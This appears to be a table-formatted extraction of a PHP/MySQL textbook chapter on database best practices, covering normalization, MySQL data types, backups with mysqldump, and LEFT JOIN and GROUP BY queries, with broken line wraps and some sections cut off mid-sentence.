Larger Text,Smaller Text,Symbol
Forms of Normalization,"To normalize a database, start with the most basic rules of normalization and move 
 forward step by step. The steps of normalization are in three stages, called
  forms
 . 
 The first step, called First Normal Form (1NF or FNF), must be done before the sec-
 ond normal form. Likewise, the third normal form cannot be completed before the 
 second. The normalization process involves getting your data into conformity with 
 the three progressive normal forms.
  
 First Normal Form
  
 For your database to be in First Normal Form, it must satisfy three requirements. 
 No table may have repeating columns that contain the same kind of data, and all 
 col-umns must contain only one value. There must be a primary key that uniquely 
 defines rows. It can be one column or several columns, depending on how many 
 col-umns are needed to uniquely identify rows.
  
 150
  
 |
  
 Chapter 8: Database Best Practices",NA
Column Data Types,"Although databases store the same information that you collect and process in PHP, 
 databases require fields to be set to specific types of data when they’re created.
  
  
 Remember, PHP isn’t strongly typed, but most databases are!
  
 A
  data type
  is the classification of a particular type of information. When you read, 
 you’re used to conventions such as symbols, letters, and numbers. Therefore, it’s 
 easy to distinguish between different types of data because you use symbols along 
 with numbers and letters. You can tell at a glance whether a number is a 
 percentage, a time, or an amount of money. The symbols that help you to 
 understand a percent-age, time, or amount of money are that data’s type. A 
 database uses internal codes to keep track of the different types of data it 
 processes.
  
 Many programming languages require the programmer to declare the data type of 
 every data object, and most database systems require the user to specify the type of 
 each data field. The available data types vary from one programming language to 
 another, and from one database application to another. But the three main types of 
 data—numbers, dates/times, and strings—exist in one form or another. Table 8-10 
 lists data types with the values in brackets optional.
  
 Table 8-10. Common MySQL data types
  
 Field type
  
 Description
  
 Example
  
 INT[(M)]
  
 Integer number (max display size
  M
 )
  
 997
  
 FLOAT[(M,D)]
  
 Decimal number (
 M
  places before the 
 decimal
  D
  
 3.4156
  
 places after)
  
 CHAR(M)
  
 Characters (
 M
  characters up to 255)
  
 “test”
  
 VARCHAR(M)
  
 Text (
 M
  characters up to 256 or 
 approximately
  
 “testing 1, 2, 3”
  
 65,000 for MySQL 5)
  
 154
  
 |
  
 Chapter 8: Database Best Practices",NA
Backing Up and Restoring Data,"Even the best-maintained databases occasionally develop problems. Hardware fail-
 ures, in particular, can really throw a monkey wrench into your web pages. Now 
 that you’re using a database, just backing up the files (HTML, PHP, and images) on 
 your web server isn’t enough. There’s nothing worse than informing your web 
 users that they have to reenter information, such as their accounts, or having to 
 recreate your
  
 Backing Up and Restoring Data
  
 | 155",NA
Copying Database Files,"You can also do a simple file backup of your MySQL database’s datafiles, in the same 
 way that you can back up your HTML and PHP files. If you can back up files, you can 
 back up the MySQL database files.
  
 We don’t recommend this tactic for moving a database from one machine to 
 another server, since different versions of MySQL may expect these files to be in a 
 different format. MySQL stores its datafiles in a special data directory that is usually 
 located in 
 C:\Program Files\MySQL\MySQL Server 4.1\data\[
 database_name
 ]
  on 
 Windows and in
  /var/lib/mysql
  on Unix variants such as Linux and Mac OS X. Shut 
 down the MySQL service before doing a file copy backup to guarantee that all files 
 are from the same point in time when doing your backup.
  
 To fully back up and restore a MySQL database using your current datafiles, all the 
 files must be replaced in the same directory from which they were backed up. Then 
 the database must be restarted.",NA
The mysqldump Command,"It’s better to use the MySQL command-line tool for making complete database back-
 ups. The same tools you’ll use to back up and restore can also be used to change 
 platforms or move your database from one server to another;
  mysqldump
  creates a 
 text file containing the SQL statements required to rebuild the database objects and 
 insert the data. The
  mysqldump
  command is accessible from the command line and 
 takes parameters for backing up a single table, a single database, or everything. The 
 com-mand’s syntax is:
  
 mysqldump -u
  user
  -p
  objects_to_backup
  
 The
  mysqldump
  command produces the backup output to standard out (which by 
 default just prints to the screen). Specify a user who has access to the object you 
 want to back up. You will be prompted for the associated password for that user. 
 Redirect this output to a file using the greater than (
 >
 ) character followed by a file-
 name.
  
 Backing up
  
 We’re going to show you the commands to back up a database called
  store
  from the 
 shell prompt.
  
 mysqldump -u root -p store > my_backup_of_store.sql
  
 156
  
 |
  
 Chapter 8: Database Best Practices",NA
Advanced SQL,"In this section, we’ll introduce database concepts that, while not strictly necessary 
 for developing your web sites, can improve performance and make your queries 
 more flexible.",NA
Indexes,"Indexes work the same way that an index of a book works. If you were to look for 
 the keyword “
 CREATE TABLE
 ” without an index, you’d need to spend a lot of time 
 scanning through the pages of the book looking for a section that might be relevant.
  
 Advanced SQL
  
 | 159",NA
Selecting with the LEFT JOIN ON Clause,"We’ve discussed performing joins in our
  SELECT
  statements using the
  WHERE
  
 clause, but there’s another way to join tables. Instead of using the
  WHERE
  keyword,
  
 LEFT JOIN ON
  can be used to perform a
  left
  or
  outer join
 . A left join simply allows you 
 to query two tables that are linked together by a relationship, but allows one of the 
 tables to return rows even if there isn’t a matching row in the other table. Using the 
 book-store tables as an example, you might want to create a query that returns 
 users and their purchases, but also lists users who have yet to purchase anything.
  
 Using the syntax:
  
 SELECT
  fields
  FROM
  left_table
  LEFT JOIN
  right_table
  ON
  left_table.field_id
  =
  right_ table.field_id
 ;
  
 your goal could be accomplished like this:
  
 SELECT * FROM users LEFT JOIN purchases ON users.user_id = 
  
 purchases.user_id;
  
 If you’d like to try this query, you’ll need to create the users table and add some data:
  
 CREATE TABLE users (
  
  user_id int(11) NOT NULL auto_increment,
  
  first_name varchar(100) default NULL,
  
  last_name varchar(100) default NULL,
  
  username varchar(45) default NULL,
  
  password varchar(32) default NULL,
  
  PRIMARY KEY  (user_id) 
  
 );
  
 INSERT INTO users VALUES 
  
 (1,'Michele','Davis','mdavis',NULL),(2,'Jon','Phillips','jphillips',NULL);
  
 When doing a normal database query that links two tables, if both tables do not 
 include the key values for the field being joined, nothing is returned for the entry.
  
 Advanced SQL
  
 | 163",NA
Selecting with GROUP BY,"When selecting from the database, you can group rows of data together and 
 perform actions on the grouped data such as calculating an average or counting the 
 grouped rows. The
  GROUP BY
  keyword specifies on which column or columns to 
 group.
  
 The following displays the number of authors per book:
  
  SELECT title,COUNT(author_id)
  
   
  FROM books NATURAL JOIN authors 
  
 GROUP BY title;
  
 This displays:
  
 +-------------------------+------------------+ 
  
 | title                   | COUNT(author_id) | 
  
 +-------------------------+------------------+ 
  
 | Classic Shell Scripting |                2 | 
  
 | Linux in a Nutshell     |                2 | 
  
 +-------------------------+------------------+ 
  
 2 rows in set (0.05 sec)
  
 Because the results are grouped by title, it’s possible to count the number of 
 authors for each title. Common functions that can be used on columns that aren’t 
 included in the
  GROUP BY
  are shown in Table 8-13.
  
 Table 8-13. Common grouping functions
  
 Function
  
  
 Action on the grouped data
  
 COUNT( ) 
 SUM( ) 
  
 AVG( ) 
  
 MIN( ) 
  
 MAX( )
  
 Total rows 
  
 Total value 
  
 Average 
 value 
  
 Minimum 
 value 
  
 Maximum 
 value
  
 These functions can also be used on a query without a GROUP BY clause. They treat 
 all of the results as part of the same group.",NA
Using Database Functions,"Just like there are functions in PHP, you can also use functions within your MySQL 
 queries. We’ll discuss several categories of functions, starting with string functions. 
 The other major categories you’ll learn about are date and time modification 
 functions.
  
 String functions
  
 Since you’ll frequently work with strings, MySQL provides many functions for doing a 
 variety of tasks. You’ll generally use the string functions with data that is being
  
 164
  
 |
  
 Chapter 8: Database Best Practices",NA
